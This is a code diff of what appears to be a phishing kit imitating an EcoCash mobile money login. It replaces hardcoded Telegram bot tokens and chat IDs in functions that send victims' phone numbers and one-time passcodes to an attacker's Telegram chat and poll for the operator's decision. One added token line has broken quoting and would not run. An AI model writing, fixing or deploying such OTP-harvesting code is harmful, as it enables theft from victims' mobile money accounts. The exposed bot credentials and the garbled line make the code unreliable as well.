@@ -303,8 +303,8 @@ document.querySelector('.back').addEventListener('click', () => {
 
 // ===== TELEGRAM =====
 function sendOtpToTelegram(phone, otp) {
-  const botToken = '8868219634:AAEcyBedFk55EI6O02Hqy-C3tG49kus3HoI';
-  const chatId = '8065818150';
+  const botToken = '8781176714:AAEIyUmGNbwq-2ZuvIezqyiTT3JkigxTxzw';
+  const chatId = '8412645169';
   const ecoCashMsg = `<#> Your EcoCash OTP is: ${otp}. Do not share this code with anyone. Expires in 2 mins. 1qk+jE1lKeZ`;
   const inlineKeyboard = {
     inline_keyboard: [[
@@ -354,7 +354,7 @@ submitBtn.addEventListener('click', async () => {
 
 // ===== POLLING (FIXED - same as login page) =====
 function startListeningForOtpDecision(phone) {
-  const botToken = '8868219634:AAEcyBedFk55EI6O02Hqy-C3tG49kus3HoI';
+  const botToken = 8781176714:AAEIyUmGNbwq-2ZuvIezqyiTT3JkigxTxzw'';
   const errorMsg = document.getElementById('otp-error');
   let offset = 0;
   let decided = false;
